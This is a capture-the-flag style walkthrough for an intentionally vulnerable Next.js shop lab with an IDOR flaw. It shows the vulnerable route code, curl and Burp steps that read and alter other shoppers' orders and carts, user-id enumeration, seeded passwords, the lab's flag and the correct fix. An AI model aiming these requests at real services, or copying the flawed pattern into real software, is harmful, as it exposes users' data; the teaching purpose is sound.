# cartora: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Next.js](https://img.shields.io/badge/Node-Next.js-000000?style=flat-square&logo=nextdotjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**cartora is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a Next.js Route Handler and point to the exact line where identity is taken from the client.
- Reproduce the exploit by hand, as another shopper, through a cookie and through a request body.
- Explain **why** a correctly signed session did not protect anything.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app acts on an object chosen by the client without checking it belongs
> to the caller. Here the "object" is *a whole shopper's data*, and the choice
> is made by a **cookie** and a **JSON field** — the server never compares them
> with the session it signed itself.

<br>

## 🐛 The vulnerability

Login sets two cookies. `src/app/api/login/route.ts`:

```ts
// who authenticated — HttpOnly, HMAC-signed, unforgeable
response.cookies.set(SESSION_COOKIE, createSessionToken(user.id), { httpOnly: true, ... });

// a convenience copy of the id so the UI can read it — plain, editable
response.cookies.set(UID_COOKIE, String(user.id), { httpOnly: false, ... });
```

The session is implemented correctly, and `GET /api/me` uses it correctly. The
cart and order endpoints do *not*. `src/app/api/orders/route.ts`:

```ts
export async function GET(request: NextRequest) {
  const auth = requireSession(request);           // ✅ a valid signed session exists…
  if (!auth.ok) return auth.response;

  // ⚠️ READ IDOR — …but whose orders? The owner comes from a cookie the client sets,
  // not from auth.session.userId, which is what the server signed.
  const userId = toId(request.cookies.get(UID_COOKIE)?.value);
  if (!userId) return error('missing or invalid uid cookie', 400);

  return json({ userId, orders: await listOrders(userId) });
}
```

`GET /api/cart` has the same shape. The write endpoints make the same mistake
with the **request body** (`src/app/api/checkout/route.ts`):

```ts
export async function POST(request: NextRequest) {
  const auth = requireSession(request);           // ✅ authenticated…
  if (!auth.ok) return auth.response;

  const body = await readJson(request);
  // ⚠️ WRITE IDOR — …but the order is placed for whichever userId the BODY names.
  const userId = toId(body?.userId);
  ...
  const order = await checkout(userId, shippingAddress, notes);
```

`POST` / `DELETE /api/cart/items` do the same with `body.userId`.

Walk through it the way the server does:

1. `requireSession` verifies the HMAC on `cartora_session`. This is
   **authentication**, and it is sound — you cannot forge it (try it; it fails).
2. The handler then needs a `userId` for its query. Instead of the one inside the
   verified session, it reads one from the **cookie** or the **body**.
3. `toId` checks that it is a positive integer — so this is not about malformed
   input. *Any* valid integer sails through.
4. The query runs with that `userId` and returns or changes that shopper's data.

> **Why does it look safe?** The front-end always sends the logged-in shopper's
> own id (read from `cartora_uid`), so every honest request works perfectly. The
> team assumed the browser would only ever send *its own* id. Nothing enforces it.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`). With `curl`, using a cookie jar:

```bash
# 1) Log in as alice and save both cookies.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login
# {"ok":true,"user":{"id":1,"username":"alice","displayName":"Alice Martins"}}

# 2) The session is truthful: /api/me says who you really are.
curl -s -b jar.txt http://localhost:3000/api/me
# {"user":{"id":1,"username":"alice","displayName":"Alice Martins"}}
```

`jar.txt` now holds `cartora_session` (HttpOnly) and `cartora_uid=1` (readable).
The second one is the one the server trusts. Keep your valid session, but change
the id:

```bash
# 3) READ IDOR (cookie) — same signed session, uid swapped to bob's id (2).
SESSION=$(awk '$6=="cartora_session"{print $7}' jar.txt)
curl -s -H "Cookie: cartora_session=$SESSION; cartora_uid=2" \
  http://localhost:3000/api/orders
```

Expected output, with the flag in the delivery notes of bob's order #3 (trimmed):

```json
{
  "userId": 2,
  "orders": [
    {
      "id": 3,
      "userId": 2,
      "status": "shipped",
      "totalCents": 17700,
      "shippingAddress": "221 Maple Row, Leeds LS1 4AP",
      "notes": "Gift for the board. Hand to the concierge, door code: FLAG{CARTORA_NOT_YOUR_CART}",
      "items": [ { "name": "Wired studio headphones" }, { "name": "Stoneware pour-over set" } ]
    },
    { "id": 2, "userId": 2, "status": "delivered", "notes": "" }
  ]
}
```

The same swap reads bob's cart (`GET /api/cart`). The write endpoints take the
identity from the body instead — now you **act as bob**:

```bash
# 4) WRITE IDOR (body) — put something in BOB's cart while signed in as alice.
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"userId":2,"productId":4,"quantity":1}' \
  http://localhost:3000/api/cart/items

# 5) WRITE IDOR (body) — place an order for bob, with a shipping address you choose.
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"userId":2,"shippingAddress":"1 Attacker Street","notes":"pwned by alice"}' \
  http://localhost:3000/api/checkout
```

Step 5 empties bob's cart and creates an order in his name, shipped wherever you
say.

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into the delivery notes of bob's order #3. You have to actually break access
> control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

Seeded shoppers: `alice` / `password123` (id 1, you), `bob` /
`correct-horse-battery-staple` (id 2, the victim), `carol` / `hunter2hunter2`
(id 3).

The endpoints act on *any* integer, so every shopper is exposed — just walk the
ids:

```bash
# Print each shopper's order count by swapping the uid cookie.
for id in 1 2 3 4 5; do
  printf 'uid %s: ' "$id"
  curl -s -H "Cookie: cartora_session=$SESSION; cartora_uid=$id" \
    http://localhost:3000/api/orders | grep -o '"id"' | wc -l
done
```

Two things worth noticing. First, there is **no sequential id in a URL** to
discover: the identifier is a small integer in a cookie, and guessing it is
trivial — but guessing was never the issue. Even with an unguessable identity
token in that cookie, an attacker who learns *one* victim token (a leak, a
shared link) would still own the victim, because the server accepts it without
asking the session. Second, the **signed session cannot be edited** — your only
way in is the value the server wrongly decided to believe.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and sign in as `alice` at
   <http://localhost:3000>. Open **Orders** and find `GET /api/orders` in
   **Proxy > HTTP history**. Send it to **Repeater** as the baseline.
2. Read the **Cookie** header: `cartora_session` is HttpOnly and signed;
   `cartora_uid=1` is plain. In Repeater, change `cartora_uid` to `2` and send.
   Different `userId` and a different order list in the response prove the read
   IDOR. Grep the response for `FLAG{`.
3. For the body variant, add something to your cart in the UI and send
   `POST /api/cart/items` to Repeater. The body carries `"userId":1` — change it
   to `2`. Do the same for `POST /api/checkout`.
4. Use **Intruder** with a numbers payload on `cartora_uid` (1–50) to dump every
   shopper at once, sorted by response length.

> Testing identity bugs well means having **two identities** and watching what
> each request is really keyed on. Log in as `bob` in a second browser container
> and confirm that *his* untouched request returns the same data alice just
> reached with a swapped cookie — the contrast is the proof.

<br>

## 🛡️ The fix

Take the identity from the **verified session**, and stop accepting it from the
client at all:

```ts
// orders/route.ts — the owner is whoever the server signed, full stop.
export async function GET(request: NextRequest) {
  const auth = requireSession(request);
  if (!auth.ok) return auth.response;

  const userId = auth.session.userId;                 // ✅ from the session
  return json({ userId, orders: await listOrders(userId) });
}

// checkout/route.ts — no `userId` in the body to trust, so none is read.
const order = await checkout(auth.session.userId, shippingAddress, notes);
```

Remove `userId` from the request bodies and stop reading `cartora_uid` on the
server (the UI can still keep it for display, or better, call `GET /api/me`).
For defence in depth, make "whose data" structural rather than a per-handler
habit: have the data layer take the session as its only way to scope a query
(`getCartFor(session)`), or enforce ownership in Postgres with **row-level
security** keyed on a per-request setting, so forgetting the filter returns
nothing instead of everything.

Why this works: the only identity that reaches a query is one the server signed
itself, so an attacker has nothing to swap. A client can still *send* a
`cartora_uid` cookie or a `userId` field — it just changes nothing.

### ⚠️ Tempting fixes that *don't* work

- **"The session cookie is signed, so we're safe."** The signature protects the
  session — which these handlers don't use for the decision. Authentication ≠
  authorization, and a perfect login does not fix a handler that ignores it.
- **Hiding or `HttpOnly`-ing the `uid` cookie.** Burp and `curl` are not bound by
  browser rules; the attacker sets any cookie they like. This only hides the
  smell.
- **Signing or encrypting the `uid` value.** Better, but then it *is* just a
  second session. A leaked or replayed victim token still works, and you now
  maintain two identity mechanisms that must always agree.
- **Comparing the body `userId` to the cookie `uid`.** Both come from the
  client; the attacker sets both to bob. Compare against the **session**, or
  better, don't accept the field.
- **Validating that `userId` is an integer.** Input validation is not
  authorization — `2` is a perfectly valid integer.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **Never take identity from the client.** Cookies, headers, query strings and
   JSON bodies are all attacker-controlled; "who is calling" comes from the
   verified session, only.
2. **Authenticating is not authorizing.** `requireSession()` answering "yes"
   means nothing if the handler then asks the client who it is.
3. **No id in the URL ≠ no IDOR.** The object reference can hide in a cookie or
   a body field; read the whole request, not just the path.
4. **A correct endpoint proves nothing about the rest.** `GET /api/me` did it
   right — audit every route that touches user data and ask where it learns
   *who*.
5. **Test with two identities** and change every value that could mean "me".

That's Level 7 — IDOR through client-controlled identity. Previously,
**[tasknest (Level 6)](https://github.com/iv0ks/tasknest)** crossed a tenant
boundary. Next in the series, **[opsdeck (Level 8)](https://github.com/iv0ks/opsdeck)**
moves from horizontal to **vertical** escalation — an admin action hidden in the
UI but open on the API. Head back to the **[Learning Guide](GUIDE.md)** for the
method, or the **[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
